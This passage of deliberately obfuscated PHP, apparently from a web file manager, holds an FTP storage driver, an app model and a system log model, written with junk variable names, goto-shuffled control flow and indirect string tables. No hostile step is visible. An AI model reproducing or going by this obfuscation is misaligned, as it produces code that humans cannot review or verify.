F‡ƒñÖĞÌİ: $this->tempFileRemve($d±™ù¼¿äÙ); return $Dø ¼“‡²¦; goto e¹Ó¥²£×; cğá‡ò’§”: if (!$this->_isconn()) { return !1; } $F†·»­ŠÍ = $this->pathThis($this->iconvSystem($EŠàì¹ï– )); $d±™ù¼¿äÙ = $this->tempFile($F†·»­ŠÍ); goto Dâ÷‰¤Ë; Dâ÷‰¤Ë: $Föœ´Îù†ø = $this->iconvApp($d±™ù¼¿äÙ); $this->download($EŠàì¹ï– , $Föœ´Îù†ø); $Dø ¼“‡²¦ = $this->upload($B¤ŸÃï¤Œ, $Föœ´Îù†ø); goto F‡ƒñÖĞÌİ; e¹Ó¥²£×: } public function moveFile($açïÊİñ†Š, $bâêïº‰«…) { if (!$this->_isconn()) { return !1; } $açïÊİñ†Š = $this->iconvSystem($açïÊİñ†Š); $bâêïº‰«… = $this->iconvSystem($bâêïº‰«…); $e¹ÒïôğŒæ = @ftp_rename($this->connect, $açïÊİñ†Š, $bâêïº‰«…); return $e¹ÒïôğŒæ ? $this->getPathOuter($bâêïº‰«…) : !1; } public function delFile($F‘˜å‰ã—) { if (!$this->_isconn()) { return !1; } $F‘˜å‰ã— = $this->iconvSystem($F‘˜å‰ã—); return @ftp_delete($this->connect, $F‘˜å‰ã—); } public function delFolder($EÈ›¥¦§Ñí) { goto d„°øß‚‡; d„°øß‚‡: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $A»¨Ì²‹Ù = $eËµêÛô·è = array(); goto f…Ã°‹¬À‚; C˜îƒ‹¹‰ó: foreach ($A»¨Ì²‹Ù as $E‰–ã¤¢‚) { $E‰–ã¤¢‚ = $this->iconvSystem($E‰–ã¤¢‚); $A‡İ­àôÆ = @ftp_rmdir($this->connect, $E‰–ã¤¢‚); if (!$A‡İ­àôÆ) { return !1; } } $EÈ›¥¦§Ñí = $this->iconvSystem($EÈ›¥¦§Ñí); return @ftp_rmdir($this->connect, $EÈ›¥¦§Ñí); goto B…ùŠÍ„©†; f…Ã°‹¬À‚: $this->fileList($EÈ›¥¦§Ñí, $A»¨Ì²‹Ù, $eËµêÛô·è, !0); $this->listItemCache = !0; foreach ($eËµêÛô·è as $E‡Œ‡Ñë½×) { $E‰–ã¤¢‚ = $this->iconvSystem($E‡Œ‡Ñë½×[$_SERVER[¢Í][28]]); $A‡İ­àôÆ = @ftp_delete($this->connect, $E‰–ã¤¢‚); if (!$A‡İ­àôÆ) { return !1; } } goto C˜îƒ‹¹‰ó; B…ùŠÍ„©†: } public function rename($BÅ’¹•Ê…š, $e‹±±Ÿ”ß) { goto Aë‚‚ğ¹; Aí™Å‡õ: return $D’ôÇ“â¶ˆ ? $this->getPathOuter($bÈ†¢×¡¸Ø) : !1; goto f¹Í¢†¨ˆ¶; c÷Ê‰ç‡Ú: $aËâÃ¯¦‚ = $this->iconvSystem($aËâÃ¯¦‚); $BÅ’¹•Ê…š = $this->iconvSystem($BÅ’¹•Ê…š); $d¶š½ƒîİ = $this->pathFather($BÅ’¹•Ê…š); goto f‚áÆˆë¹«; Aë‚‚ğ¹: $BĞ¨Ğîó™¯ =& $_SERVER[¢Í]; if (!$this->_isconn()) { return !1; } $aËâÃ¯¦‚ = $this->fileNameAuto($this->pathFather($BÅ’¹•Ê…š), $e‹±±Ÿ”ß); goto c÷Ê‰ç‡Ú; f‚áÆˆë¹«: $bÈ†¢×¡¸Ø = rtrim($d¶š½ƒîİ, $BĞ¨Ğîó™¯[8]) . $BĞ¨Ğîó™¯[8] . $aËâÃ¯¦‚; $D’ôÇ“â¶ˆ = @ftp_rename($this->connect, $BÅ’¹•Ê…š, $bÈ†¢×¡¸Ø); $bÈ†¢×¡¸Ø = $this->iconvApp($bÈ†¢×¡¸Ø); goto Aí™Å‡õ; f¹Í¢†¨ˆ¶: } private function folderInfo($bÕÕ³½¹Î§, $D«Ö¬ß‰â­ = false) { $C»ƒí˜Âç =& $_SERVER[¢Í]; $d•ë´¦°ÇÍ = array($C»ƒí˜Âç[28] => $this->pathThis($bÕÕ³½¹Î§), $C»ƒí˜Âç[85] => $this->getPathOuter($C»ƒí˜Âç[8] . $bÕÕ³½¹Î§), $C»ƒí˜Âç[29] => $C»ƒí˜Âç[86]); if ($D«Ö¬ß‰â­) { return $d•ë´¦°ÇÍ; } $d•ë´¦°ÇÍ[$C»ƒí˜Âç[200]] = $d•ë´¦°ÇÍ[$C»ƒí˜Âç[117]] = 0; $d•ë´¦°ÇÍ[$C»ƒí˜Âç[201]] = $d•ë´¦°ÇÍ[$C»ƒí˜Âç[202]] = !0; return $d•ë´¦°ÇÍ; } private function fileInfo($C˜Õà¤Ï¦ğ, $C»ÂÒ««À¦ = false, $bËÏˆá¥Œ¯ = array()) { goto a‚½„¹º°š; B©—¼ó†¦÷: $b‚èñ¼ˆïã[$døÛ¯èÔ‹[200]] = $b‚èñ¼ˆïã[$døÛ¯èÔ‹[117]] = 0; $b‚èñ¼ˆïã[$døÛ¯èÔ‹[201]] = $b‚èñ¼ˆïã[$døÛ¯èÔ‹[202]] = !0; $c”öèÒÁ‹§ = $this->iconvSystem($C˜Õà¤Ï¦ğ); goto dÏÏŞ¼ŒØ³; EáŒ¹Ì¥••: return $b‚èñ¼ˆïã; goto BÆ¤ßÊ˜¥æ; a‚½„¹º°š: $døÛ¯èÔ‹ =& $_SERVER[¢Í]; $b‚èñ¼ˆïã = array($døÛ¯èÔ‹[28] => $this->pathThis($C˜Õà¤Ï¦ğ), $døÛ¯èÔ‹[85] => $this->getPathOuter($døÛ¯èÔ‹[8] . $C˜Õà¤Ï¦ğ), $døÛ¯èÔ‹[29] => $døÛ¯èÔ‹[181], $døÛ¯èÔ‹[87] => isset($bËÏˆá¥Œ¯[$døÛ¯èÔ‹[87]]) ? $bËÏˆá¥Œ¯[$døÛ¯èÔ‹[87]] : 0, $døÛ¯èÔ‹[175] => $this->ext($C˜Õà¤Ï¦ğ)); if ($C»ÂÒ««À¦) { return $b‚èñ¼ˆïã; } goto B©—¼ó†¦÷; dÏÏŞ¼ŒØ³: $b‚èñ¼ˆïã[$døÛ¯èÔ‹[117]] = @ftp_mdtm($this->connect, $c”öèÒÁ‹§); if (empty($bËÏˆá¥Œ¯)) { $bËÏˆá¥Œ¯ = $this->objectMeta($C˜Õà¤Ï¦ğ); if (!$bËÏˆá¥Œ¯) { return $b‚èñ¼ˆïã; } } $b‚èñ¼ˆïã[$døÛ¯èÔ‹[87]] = $bËÏˆá¥Œ¯[$døÛ¯èÔ‹[87]]; goto EáŒ¹Ì¥••; BÆ¤ßÊ˜¥æ: } public function size($dƒŠâáøåĞ) { $cÈÑ»´¬é = $this->objectMeta($dƒŠâáøåĞ); return $cÈÑ»´¬é ? $cÈÑ»´¬é[$_SERVER[¢Í][87]] : 0; } public function info($eÜìÄ›ƒƒÚ) { if ($this->isFile($eÜìÄ›ƒƒÚ)) { return $this->fileInfo($eÜìÄ›ƒƒÚ, 0); } else { if ($this->isFolder($eÜìÄ›ƒƒÚ)) { return $this->folderInfo($eÜìÄ›ƒƒÚ); } } return !1; } private function fileList($eìïÃŒ¤òç, &$e”¨«Æá£¬, &$cƒ®ë“ê”¾, $DÅÃÂÜâÔÆ = false) { goto E”ç¯ƒÇ®¨; AÓß„æ±‘ë: $aš×ëÀ ¾á = $this->listItemCache === !1 ? !1 : !0; $Aæôª’Áğ = @ftp_rawlist($this->connect, $eìïÃŒ¤òç); if (!$Aæôª’Áğ) { $Aæôª’Áğ = array(); } goto d¸˜Î‹„î´; E”ç¯ƒÇ®¨: $e¡ëîÁ«£ =& $_SERVER[¢Í]; $eìïÃŒ¤òç = $this->iconvSystem($eìïÃŒ¤òç); if (!$this->isFolder($eìïÃŒ¤òç)) { return !1; } goto E½”•¸ò¤; E½”•¸ò¤: @ftp_chdir($this->connect, $e¡ëîÁ«£[8]); $eìïÃŒ¤òç = rtrim($eìïÃŒ¤òç, $e¡ëîÁ«£[8]) . $e¡ëîÁ«£[8]; check_abort(); goto AÓß„æ±‘ë; d¸˜Î‹„î´: $fÊ±Ú—°¬… = array($e¡ëîÁ«£[101] => 1, $e¡ëîÁ«£[1214] => 1); foreach ($Aæôª’Áğ as $BîÌ•Û§¤™) { goto e¦Šè’í²×; F°«İãà¶: if (substr($BîÌ•Û§¤™, 0, 1) == $e¡ëîÁ«£[1215]) { $C‹¢æ»ƒ [$e¡ëîÁ«£[29]] = $e¡ëîÁ«£[86]; $C‹¢æ»ƒ [$e¡ëîÁ«£[87]] = 0; } $DÙÏ©¯÷Ò = $C‹¢æ»ƒ [$e¡ëîÁ«£[29]] == $e¡ëîÁ«£[86] ? !0 : !1; if ($aš×ëÀ ¾á) { $this->cacheMethod($e¡ëîÁ«£[205], $eæ†³­ŞåË, $DÙÏ©¯÷Ò); $this->cacheMethod($e¡ëîÁ«£[206], $eæ†³­ŞåË, $C‹¢æ»ƒ ); } goto d»œ—ã†ª¥; d»œ—ã†ª¥: if ($DÙÏ©¯÷Ò) { $e”¨«Æá£¬[] = $eæ†³­ŞåË; if ($DÅÃÂÜâÔÆ) { $this->fileList($eæ†³­ŞåË, $e”¨«Æá£¬, $cƒ®ë“ê”¾, $DÅÃÂÜâÔÆ); } continue; } $cƒ®ë“ê”¾[] = $C‹¢æ»ƒ ; goto AÅ·¶ÓÏ„; aÜİíŒ“Ù: if (!$eæ†³­ŞåË || isset($fÊ±Ú—°¬…[$eæ†³­ŞåË])) { continue; } $eæ†³­ŞåË = $this->iconvApp($eìïÃŒ¤òç . ltrim($eæ†³­ŞåË, $e¡ëîÁ«£[8])); $C‹¢æ»ƒ  = array($e¡ëîÁ«£[28] => $eæ†³­ŞåË, $e¡ëîÁ«£[29] => $e¡ëîÁ«£[181], $e¡ëîÁ«£[87] => $bëÑ­ƒê¾›[4]); goto F°«İãà¶; e¦Šè’í²×: $bëÑ­ƒê¾› = $this->_listItem($BîÌ•Û§¤™); if ($bëÑ­ƒê¾›[0] == $e¡ëîÁ«£[709]) { continue; } $eæ†³­ŞåË = $bëÑ­ƒê¾›[8]; goto aÜİíŒ“Ù; AÅ·¶ÓÏ„: } if ($aš×ëÀ ¾á) { $this->cacheMethod($e¡ëîÁ«£[205], $eìïÃŒ¤òç, !0); } goto Aî¢ÚåÕÌê; Aî¢ÚåÕÌê: } private function _listItem($b…£ĞËõá£) { if (empty($b…£ĞËõá£)) { return array(); } $Cµ¾Á›êø = preg_split($_SERVER[¢Í][1216], $b…£ĞËõá£); if (count($Cµ¾Á›êø) <= 9) { return $Cµ¾Á›êø; } $Cµ¾Á›êø[8] = trim(substr($b…£ĞËõá£, strpos($b…£ĞËõá£, $Cµ¾Á›êø[7]) + strlen($Cµ¾Á›êø[7]))); return array_splice($Cµ¾Á›êø, 0, 9); } public function listPath($F®©ÃÆßƒÆ, $A±êÇÇ„¹„ = false) { goto cæÇ„é‹å‡; cæÇ„é‹å‡: $F¯ßÁ—³ØÓ =& $_SERVER[¢Í]; if (!$this->_isconn()) { return !1; } $eéÏô¦—ñ‘ = $CÑœŞ¹”Ş— = array(); goto E’„Æõì; E’„Æõì: $this->fileList($F®©ÃÆßƒÆ, $eéÏô¦—ñ‘, $CÑœŞ¹”Ş—); foreach ($eéÏô¦—ñ‘ as $dè½á…ŒÍã => $AÔùÅ‹ˆŒò) { $eéÏô¦—ñ‘[$dè½á…ŒÍã] = $this->folderInfo($AÔùÅ‹ˆŒò, $A±êÇÇ„¹„); } foreach ($CÑœŞ¹”Ş— as $dè½á…ŒÍã => $AÔùÅ‹ˆŒò) { $CÑœŞ¹”Ş—[$dè½á…ŒÍã] = $this->fileInfo($AÔùÅ‹ˆŒò[$F¯ßÁ—³ØÓ[28]], $A±êÇÇ„¹„, $AÔùÅ‹ˆŒò); } goto dÓ½ÁšÔÈ; dÓ½ÁšÔÈ: return array($F¯ßÁ—³ØÓ[84] => $eéÏô¦—ñ‘, $F¯ßÁ—³ØÓ[83] => $CÑœŞ¹”Ş—); goto eÇ´õÒó§©; eÇ´õÒó§©: } public function has($E¡‡‡ç™àå, $BÛõäÇÑŒø = false, $EŸğ©ìË¨‚ = true) { goto FŸ˜¹Èëã; B„’æøµÍÛ: $this->fileList($E¡‡‡ç™àå, $dôæØ³·ŠÎ, $e³’ñ¦°Â™, $cöòÜËÉ¬); if ($BÛõäÇÑŒø) { return array($b£§é£ÂŞ’[209] => count($e³’ñ¦°Â™), $b£§é£ÂŞ’[210] => count($dôæØ³·ŠÎ)); } if ($EŸğ©ìË¨‚) { if (count($e³’ñ¦°Â™)) { return !0; } } else { if (count($dôæØ³·ŠÎ)) { return !0; } } goto FŒéâ«ÓñÁ; FŒéâ«ÓñÁ: return !1; goto B¹ã¨­½­; FŸ˜¹Èëã: $b£§é£ÂŞ’ =& $_SERVER[¢Í]; $dôæØ³·ŠÎ = $e³’ñ¦°Â™ = array(); $cöòÜËÉ¬ = $BÛõäÇÑŒø ? !0 : !1; goto B„’æøµÍÛ; B¹ã¨­½­: } public function listAll($Eöå­ˆĞ–) { goto d²ğ£²¯¾Î; DÜ°ä·ñ¾›: foreach ($eËÓ¶£ë„Ü as $dï•Éô÷“ö) { if (is_string($dï•Éô÷“ö)) { $b«öÛ‡½ï˜[$dï•Éô÷“ö] = 0; } } return $this->listAllFiles($Eöå­ˆĞ–, array_keys($b«öÛ‡½ï˜), $b«öÛ‡½ï˜); goto b§…íƒÛ«; Bçñô›Ï„¥: $this->fileList($Eöå­ˆĞ–, $eËÓ¶£ë„Ü, $E½•Î‰÷ˆÎ, !0); $b«öÛ‡½ï˜ = array(); foreach ($E½•Î‰÷ˆÎ as $dï•Éô÷“ö) { $b«öÛ‡½ï˜[$dï•Éô÷“ö[$C˜±ê×¹…[28]]] = $dï•Éô÷“ö[$C˜±ê×¹…[87]]; } goto DÜ°ä·ñ¾›; d²ğ£²¯¾Î: $C˜±ê×¹… =& $_SERVER[¢Í]; if (!$this->_isconn()) { return !1; } $eËÓ¶£ë„Ü = $E½•Î‰÷ˆÎ = array(); goto Bçñô›Ï„¥; b§…íƒÛ«: } public function getContent($F¦‰çËÈ¤¬) { if (!$this->_isconn()) { return !1; } $F¦‰çËÈ¤¬ = $this->iconvSystem($F¦‰çËÈ¤¬); return $this->fileSubstr($F¦‰çËÈ¤¬); } public function setContent($B£æß…ÇÎ, $bàºĞ¤Şò’ = '') { goto CÉšÂ‘¢—; eÆ¥ ÒÜ‡: file_put_contents($f†ÖÚ«Šˆ, $bàºĞ¤Şò’); $Eæ¨ÄœÂ© = $this->upload($B£æß…ÇÎ, $this->iconvApp($f†ÖÚ«Šˆ)); $this->tempFileRemve($f†ÖÚ«Šˆ); goto fØ‹ä¨ô¯; fØ‹ä¨ô¯: return $Eæ¨ÄœÂ©; goto EŞ‚ÓÅ¨Ù ; CÉšÂ‘¢—: if (!$this->_isconn()) { return !1; } $aîäğÈßš« = $this->pathThis($this->iconvSystem($B£æß…ÇÎ)); $f†ÖÚ«Šˆ = $this->tempFile($aîäğÈßš«); goto eÆ¥ ÒÜ‡; EŞ‚ÓÅ¨Ù : } public function fileSubstr($e†å×£ÓÕ·, $BÁÌáÚ£Ï = 0, $A‘óÓÆ½‚ó = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($e†å×£ÓÕ·, $BÁÌáÚ£Ï, $A‘óÓÆ½‚ó); } private function ftpRequest($câŸ˜ĞØâ, $e‡ÅÔ»ê¸æ = 0, $CÚšŠÖ— = false) { goto bõÍ·†Ì‰®; Dó•„ÕÍî‡: curl_setopt($D±‚òÃ·£Ú, CURLOPT_URL, $dÌæÚç– . $this->pathEncode($câŸ˜ĞØâ)); curl_setopt($D±‚òÃ·£Ú, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($CÚšŠÖ—) { $FĞ¶®à³Ú‘ = $e‡ÅÔ»ê¸æ + $CÚšŠÖ— - 1; curl_setopt($D±‚òÃ·£Ú, CURLOPT_RANGE, "{$e‡ÅÔ»ê¸æ}\55{$FĞ¶®à³Ú‘}"); } goto d—’Ùø¸ğÄ; bõÍ·†Ì‰®: $câŸ˜ĞØâ = $this->iconvSystem($câŸ˜ĞØâ); $dÌæÚç– = $this->scheme . $this->host . $_SERVER[¢Í][4] . $this->port; $D±‚òÃ·£Ú = curl_init(); goto Dó•„ÕÍî‡; C—†´ôÃ¡: return $fÃ‡º—†ìŒ; goto FÆÅ¹…Ò¨‡; d—’Ùø¸ğÄ: curl_setopt($D±‚òÃ·£Ú, CURLOPT_RETURNTRANSFER, 1); $fÃ‡º—†ìŒ = curl_exec($D±‚òÃ·£Ú); curl_close($D±‚òÃ·£Ú); goto C—†´ôÃ¡; FÆÅ¹…Ò¨‡: } public function upload($a²‚†ÆÄ•, $b·Ò’¤Ğâ, $eî¾ÂİíŒ = false, $EÅÎàâçÏ” = REPEAT_REPLACE) { goto B°§îËÁÛ«; FŸ–ÁêóËæ: if ($C©¥¯±²Œ‘ != FTP_FINISHED) { return !1; } return $this->getPathOuter($a²‚†ÆÄ•); goto aÄªÛÛÑß; aÑã‹Ïøá: $b·Ò’¤Ğâ = $this->iconvSystem($b·Ò’¤Ğâ); $C©¥¯±²Œ‘ = ftp_nb_put($this->connect, $a²‚†ÆÄ•, $b·Ò’¤Ğâ, FTP_BINARY); while ($C©¥¯±²Œ‘ == FTP_MOREDATA) { $C©¥¯±²Œ‘ = ftp_nb_continue($this->connect); } goto FŸ–ÁêóËæ; B°§îËÁÛ«: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($a²‚†ÆÄ•))) { return !1; } $a²‚†ÆÄ• = $this->iconvSystem($a²‚†ÆÄ•); goto aÑã‹Ïøá; aÄªÛÛÑß: } public function download($eÍùö¡°Âà, $eĞ­áÂ÷ºÍ = '') { goto DØº—¦Ì¶ª; Aî‹¾±²àñ: $eÍùö¡°Âà = $this->iconvSystem($eÍùö¡°Âà); $eĞ­áÂ÷ºÍ = $this->iconvSystem($eĞ­áÂ÷ºÍ); $AƒÎ›†ÚåÈ = ftp_nb_get($this->connect, $eĞ­áÂ÷ºÍ, $eÍùö¡°Âà, FTP_BINARY); goto d²Œ“‹ÔÅë; d²Œ“‹ÔÅë: while ($AƒÎ›†ÚåÈ == FTP_MOREDATA) { $AƒÎ›†ÚåÈ = ftp_nb_continue($this->connect); } if ($AƒÎ›†ÚåÈ != FTP_FINISHED) { return !1; } return $this->iconvApp($eĞ­áÂ÷ºÍ); goto bÓ—Ù¼£Ô“; DØº—¦Ì¶ª: if (!$this->_isconn()) { return !1; } $A¨Ì³Ô–¨‰ = $this->pathFather($eĞ­áÂ÷ºÍ); if (!IO::mkdir($A¨Ì³Ô–¨‰)) { return !1; } goto Aî‹¾±²àñ; bÓ—Ù¼£Ô“: } public function exist($E©°Ê¢¾°ˆ) { return $this->isFile($E©°Ê¢¾°ˆ) || $this->isFolder($E©°Ê¢¾°ˆ); } public function isFile($EæùëÛ‘„±) { return !$this->isFolder($EæùëÛ‘„±) && $this->objectMeta($EæùëÛ‘„±); } public function isFolder($DŒÒ¨ñ­ÃÇ) { return $this->cacheMethod($_SERVER[¢Í][205], $DŒÒ¨ñ­ÃÇ); } protected function objectMeta($f¦ÉÀœä¦‚) { return $this->cacheMethod($_SERVER[¢Í][206], $f¦ÉÀœä¦‚); } protected function _objectMeta($B¶ÔœÂ¸¡) { goto Bá‹»¶¿é¡; Bá‹»¶¿é¡: $E†Š¸¸ß¾ì =& $_SERVER[¢Í]; if ($B¶ÔœÂ¸¡ == $E†Š¸¸ß¾ì[33] || $B¶ÔœÂ¸¡ == $E†Š¸¸ß¾ì[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto f¹Ş¦—õ; f¹Ş¦—õ: $B¶ÔœÂ¸¡ = $this->iconvSystem($B¶ÔœÂ¸¡); $fï‰°§Šå = array($E†Š¸¸ß¾ì[28] => $this->iconvApp($B¶ÔœÂ¸¡), $E†Š¸¸ß¾ì[29] => $E†Š¸¸ß¾ì[181], $E†Š¸¸ß¾ì[87] => 0); @ftp_chdir($this->connect, $E†Š¸¸ß¾ì[8]); goto e†ëÓ™Ò²‹; e†ëÓ™Ò²‹: $B‰ä©¦ = @ftp_size($this->connect, $B¶ÔœÂ¸¡); if ($B‰ä©¦ != -1) { $fï‰°§Šå[$E†Š¸¸ß¾ì[87]] = $B‰ä©¦; } else { $dÅ™ÜÎÉ§  = @ftp_chdir($this->connect, $B¶ÔœÂ¸¡); if (!$dÅ™ÜÎÉ§ ) { return !1; } $fï‰°§Šå[$E†Š¸¸ß¾ì[29]] = $E†Š¸¸ß¾ì[86]; } return $fï‰°§Šå; goto f¬Ë‡¥µŸ„; f¬Ë‡¥µŸ„: } protected function _isFolder($DÂç«ï¹¬) { $AÙÇøß”ƒÔ =& $_SERVER[¢Í]; if ($DÂç«ï¹¬ == $AÙÇøß”ƒÔ[33] || $DÂç«ï¹¬ == $AÙÇøß”ƒÔ[8]) { return !0; } $d‘«ìÍô  = $this->_objectMeta($DÂç«ï¹¬); return isset($d‘«ìÍô [$AÙÇøß”ƒÔ[29]]) && $d‘«ìÍô [$AÙÇøß”ƒÔ[29]] == $AÙÇøß”ƒÔ[86] ? !0 : !1; } } goto e·½—š‡äã; d¦·”¤«“: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\114\151\x67\150\164\101\x70\160"; public $modelType = "\123\x79\x73\164\x65\x6d\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\x67\162\x6f\x75\x70", "\144\145\163\x63", "\143\157\156\164\x65\x6e\x74"); public function listData($F‚ìáŞœàŒ = false, $A÷†³¶ù†ó = "\x6d\157\144\151\x66\x79\x54\151\x6d\145", $aºİ‚Åì­ = true) { return parent::listData($F‚ìáŞœàŒ, $A÷†³¶ù†ó, $aºİ‚Åì­); } public function remove($Bàù’²ß§¾) { $a„îÂôŠßÑ = $this->findByName($Bàù’²ß§¾); if (!$a„îÂôŠßÑ) { return !1; } return parent::remove($a„îÂôŠßÑ[$_SERVER[¢Í][392]]); } public function add($b‰ƒßÊ„) { if ($this->findByName($b‰ƒßÊ„[$_SERVER[¢Í][28]])) { return !1; } return parent::insert($b‰ƒßÊ„); } public function update($dóŠ¡¯Ú®¸, $F¡Ì…ŸÉ‹¦) { $E‚èõƒ‹™ =& $_SERVER[¢Í]; $bÌæ¥Ó×¨ˆ = $this->findByName($dóŠ¡¯Ú®¸); $CÅ©™Ï¯ìº = $this->findByName($F¡Ì…ŸÉ‹¦[$E‚èõƒ‹™[28]]); if (!$bÌæ¥Ó×¨ˆ || $CÅ©™Ï¯ìº && $CÅ©™Ï¯ìº[$E‚èõƒ‹™[392]] != $bÌæ¥Ó×¨ˆ[$E‚èõƒ‹™[392]]) { return !1; } return parent::update($bÌæ¥Ó×¨ˆ[$E‚èõƒ‹™[392]], $F¡Ì…ŸÉ‹¦); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\151\x6d\145", "\164\151\155\145", "\151\x6e\163\x65\162\164", "\x66\x75\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $f¬ŞèµœÙ‹ =& $_SERVER[¢Í]; return array($f¬ŞèµœÙ‹[1959] => LNG($f¬ŞèµœÙ‹[1960]), $f¬ŞèµœÙ‹[1961] => LNG($f¬ŞèµœÙ‹[1962]), $f¬ŞèµœÙ‹[1587] => LNG($f¬ŞèµœÙ‹[1963]), $f¬ŞèµœÙ‹[1964] => LNG($f¬ŞèµœÙ‹[1965]), $f¬ŞèµœÙ‹[1966] => LNG($f¬ŞèµœÙ‹[1967]), $f¬ŞèµœÙ‹[1968] => LNG($f¬ŞèµœÙ‹[1969]), $f¬ŞèµœÙ‹[1970] => LNG($f¬ŞèµœÙ‹[1971]), $f¬ŞèµœÙ‹[1618] => LNG($f¬ŞèµœÙ‹[1971]), $f¬ŞèµœÙ‹[1619] => LNG($f¬ŞèµœÙ‹[1972]), $f¬ŞèµœÙ‹[1973] => LNG($f¬ŞèµœÙ‹[1974]), $f¬ŞèµœÙ‹[1975] => LNG($f¬ŞèµœÙ‹[1976]), $f¬ŞèµœÙ‹[1977] => LNG($f¬ŞèµœÙ‹[1978]), $f¬ŞèµœÙ‹[1979] => LNG($f¬ŞèµœÙ‹[1980]), $f¬ŞèµœÙ‹[1616] => LNG($f¬ŞèµœÙ‹[1981]), $f¬ŞèµœÙ‹[1623] => LNG($f¬ŞèµœÙ‹[1982]), $f¬ŞèµœÙ‹[1983] => LNG($f¬ŞèµœÙ‹[1984]), $f¬ŞèµœÙ‹[1985] => LNG($f¬ŞèµœÙ‹[1986]), $f¬ŞèµœÙ‹[1987] => LNG($f¬ŞèµœÙ‹[1988]), $f¬ŞèµœÙ‹[1989] => LNG($f¬ŞèµœÙ‹[1990]), $f¬ŞèµœÙ‹[1626] => LNG($f¬ŞèµœÙ‹[1991]), $f¬ŞèµœÙ‹[1627] => LNG($f¬ŞèµœÙ‹[1992]), $f¬ŞèµœÙ‹[1993] => LNG($f¬ŞèµœÙ‹[1994]), $f¬ŞèµœÙ‹[1995] => LNG($f¬ŞèµœÙ‹[1996]), $f¬ŞèµœÙ‹[1997] => LNG($f¬ŞèµœÙ‹[1998]), $f¬ŞèµœÙ‹[1621] => LNG($f¬ŞèµœÙ‹[1999]), $f¬ŞèµœÙ‹[2000] => LNG($f¬ŞèµœÙ‹[2001]), $f¬ŞèµœÙ‹[1620] => LNG($f¬ŞèµœÙ‹[2002]), $f¬ŞèµœÙ‹[2003] => LNG($f¬ŞèµœÙ‹[2004]), $f¬ŞèµœÙ‹[2005] => LNG($f¬ŞèµœÙ‹[2006]), $f¬ŞèµœÙ‹[2007] => LNG($f¬ŞèµœÙ‹[2007]), $f¬ŞèµœÙ‹[2008] => LNG($f¬ŞèµœÙ‹[1591]), $f¬ŞèµœÙ‹[2009] => LNG($f¬ŞèµœÙ‹[2010]), $f¬ŞèµœÙ‹[2011] => LNG($f¬ŞèµœÙ‹[2012]), $f¬ŞèµœÙ‹[2013] => LNG($f¬ŞèµœÙ‹[2014]), $f¬ŞèµœÙ‹[2015] => LNG($f¬ŞèµœÙ‹[2016]), $f¬ŞèµœÙ‹[2017] => LNG($f¬ŞèµœÙ‹[2018]), $f¬ŞèµœÙ‹[2019] => LNG($f¬ŞèµœÙ‹[2019]), $f¬ŞèµœÙ‹[2020] => LNG($f¬ŞèµœÙ‹[2021]), $f¬ŞèµœÙ‹[2022] => LNG($f¬ŞèµœÙ‹[2023]), $f¬ŞèµœÙ‹[2024] => LNG($f¬ŞèµœÙ‹[2025]), $f¬ŞèµœÙ‹[2026] => LNG($f¬ŞèµœÙ‹[2027]), $f¬ŞèµœÙ‹[2028] => LNG($f¬ŞèµœÙ‹[2029]), $f¬ŞèµœÙ‹[2030] => LNG($f¬ŞèµœÙ‹[2031])); } private function typeFile() { $cÛ‹õ¨É° =& $_SERVER[¢Í]; $aççì°‡Õ = array($cÛ‹õ¨É°[1623] => array($cÛ‹õ¨É°[1624]), $cÛ‹õ¨É°[1977] => array($cÛ‹õ¨É°[2032]), $cÛ‹õ¨É°[1979] => array($cÛ‹õ¨É°[2033]), $cÛ‹õ¨É°[1616] => array($cÛ‹õ¨É°[1617]), $cÛ‹õ¨É°[1985] => array(), $cÛ‹õ¨É°[1987] => array(), $cÛ‹õ¨É°[1989] => array(), $cÛ‹õ¨É°[1626] => array($cÛ‹õ¨É°[1628]), $cÛ‹õ¨É°[1627] => array($cÛ‹õ¨É°[1628]), $cÛ‹õ¨É°[1993] => array($cÛ‹õ¨É°[2034]), $cÛ‹õ¨É°[1995] => array($cÛ‹õ¨É°[2034]), $cÛ‹õ¨É°[1997] => array($cÛ‹õ¨É°[2035]), $cÛ‹õ¨É°[1983] => array($cÛ‹õ¨É°[2036]), $cÛ‹õ¨É°[1621] => array($cÛ‹õ¨É°[2037]), $cÛ‹õ¨É°[2000] => array($cÛ‹õ¨É°[2038]), $cÛ‹õ¨É°[1620] => array($cÛ‹õ¨É°[1622])); return $aççì°‡Õ; } private function typeAll() { goto cÎÈ…ò¹‹; Fƒ¢ÙšÇô: foreach ($fÔ½á•¥ÉØ as $Bšö¾Õˆô• => $b±™‹ áï˜) { $EÑ¨Ñ…êÕã[$b±™‹ áï˜[0]] = $EÑ¨Ñ…êÕã[$Bšö¾Õˆô•]; } $EÑ¨Ñ…êÕã[$e÷‰ºšëÂ”[1628]] = LNG($e÷‰ºšëÂ”[2039]); $EÑ¨Ñ…êÕã[$e÷‰ºšëÂ”[2034]] = LNG($e÷‰ºšëÂ”[2040]); goto e­óà™Œ¸°; cÎÈ…ò¹‹: $e÷‰ºšëÂ” =& $_SERVER[¢Í]; $EÑ¨Ñ…êÕã = $this->typeList; $fÔ½á•¥ÉØ = array_filter($this->typeFile()); goto Fƒ¢ÙšÇô; e­óà™Œ¸°: return $EÑ¨Ñ…êÕã; goto B§—…¤«¨À; B§—…¤«¨À: } public function addLog($e‹¸Û›ÓÖ±, $cì¸æ‘‘¤“ = array()) { goto F†¶Õ®êÏ·; B«¢ğ‰œåß: $cì¸æ‘‘¤“ = array($DÃ°­šÁ°‚[1480] => Session::sign(), $DÃ°­šÁ°‚[1481] => $b™˜¯”‚›, $DÃ°­šÁ°‚[29] => $e‹¸Û›ÓÖ±, $DÃ°­šÁ°‚[1483] => json_encode($cì¸æ‘‘¤“)); parent::add($cì¸æ‘‘¤“); goto A¤ö¡ªƒõ; Fè™¶®ˆò³: if (!$b™˜¯”‚›) { $b™˜¯”‚› = (int) 